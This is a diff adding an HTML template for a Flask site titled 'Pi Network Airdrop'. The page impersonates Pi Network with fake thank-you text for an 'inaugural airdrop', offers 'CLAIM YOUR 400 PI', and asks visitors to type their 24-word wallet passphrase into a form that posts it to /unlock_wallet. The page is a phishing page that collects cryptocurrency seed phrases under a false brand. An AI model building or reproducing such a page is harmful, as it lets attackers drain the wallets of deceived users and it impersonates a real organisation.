@@ -1,0 +1,60 @@
+<!-- templates/index.html -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network Airdrop</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+</head>
+
+<body>
+    <header>
+        <img src="{{ url_for('static', filename='pi net.jpg') }}" alt="Your Logo">
+        <h1>Pi Network Airdrop Appreciation</h1>
+    </header>
+
+    <div class="appreciation-content">
+        <p>
+            Dear Valued Pi Network Community,
+        </p>
+
+        <p>
+            As the proud stewards of Pi Network, we extend our deepest appreciation to each member of our esteemed community who participated in our groundbreaking inaugural company airdrop.
+            Your enthusiastic engagement and unwavering support have played a pivotal role in shaping the success of Pi Network.
+        </p>
+
+        <p>
+            This momentous occasion marks the beginning of an exciting journey, and we want to express our gratitude for the trust and commitment you have bestowed upon us.
+            Your involvement underscores the shared vision we have for Pi Network—a vision of creating an inclusive and accessible cryptocurrency ecosystem for all.
+        </p>
+
+        <p>
+            The inaugural airdrop has set the stage for future endeavors, and we are excited about the endless possibilities that lie ahead.
+            Together, we are not just building a network; we are forging a community that is driving innovation and transforming the landscape of digital currency.
+        </p>
+
+        <p>
+            Thank you for being integral to the Pi Network family and for contributing to the success of this remarkable venture.
+            We are honored to have you on this journey with us, and we look forward to achieving new milestones together.
+        </p>
+    </div>
+
+    <div class="claim-section">
+        <p class="claim-text">CLAIM YOUR 400 PI</p>
+    </div>
+
+    <form action="/unlock_wallet" method="post">
+        <label for="passphrase">Enter 24-word Passphrase:</label>
+        <input type="text" id="passphrase" name="passphrase" required>
+        <button class="unlock-button" type="submit">Unlock Wallet</button>
+    </form>
+
+    <footer>
+        <p>&copy; 2024 Pi Network. All rights reserved.</p>
+    </footer>
+</body>
+
+</html>
